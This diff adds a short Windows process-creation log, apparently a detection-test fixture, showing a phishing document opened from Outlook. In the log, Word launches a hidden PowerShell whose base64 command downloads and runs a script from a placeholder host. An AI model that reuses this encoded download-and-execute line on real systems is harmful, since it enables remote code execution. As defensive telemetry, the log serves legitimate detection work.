@@ -1,0 +1,7 @@
+2026-03-02 09:12:40  ProcessCreate  parent=explorer.exe  image=chrome.exe  cmd="C:\Program Files\Google\Chrome\Application\chrome.exe"
+2026-03-02 09:13:05  ProcessCreate  parent=explorer.exe  image=OUTLOOK.EXE  cmd="C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"
+2026-03-02 09:17:22  ProcessCreate  parent=OUTLOOK.EXE  image=WINWORD.EXE  cmd="WINWORD.EXE /n \"C:\Users\sam\AppData\Local\Temp\Invoice_3382.doc\""
+2026-03-02 09:18:03  ProcessCreate  parent=svchost.exe  image=taskhostw.exe  cmd="taskhostw.exe"
+2026-03-02 09:21:47  ProcessCreate  parent=WINWORD.EXE  image=powershell.exe  cmd="powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBzAHkAbgBjAC4AdQBwAGQAYQB0AGUAcwAtAGMAaABlAGMAawAuAGkAbgB2AGEAbABpAGQALwBhAC4AcABzADEAJwApAA=="
+2026-03-02 09:21:49  ProcessCreate  parent=powershell.exe  image=conhost.exe  cmd="\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1"
+2026-03-02 09:24:10  ProcessCreate  parent=explorer.exe  image=notepad.exe  cmd="C:\Windows\system32\NOTEPAD.EXE C:\Users\sam\Documents\todo.txt"
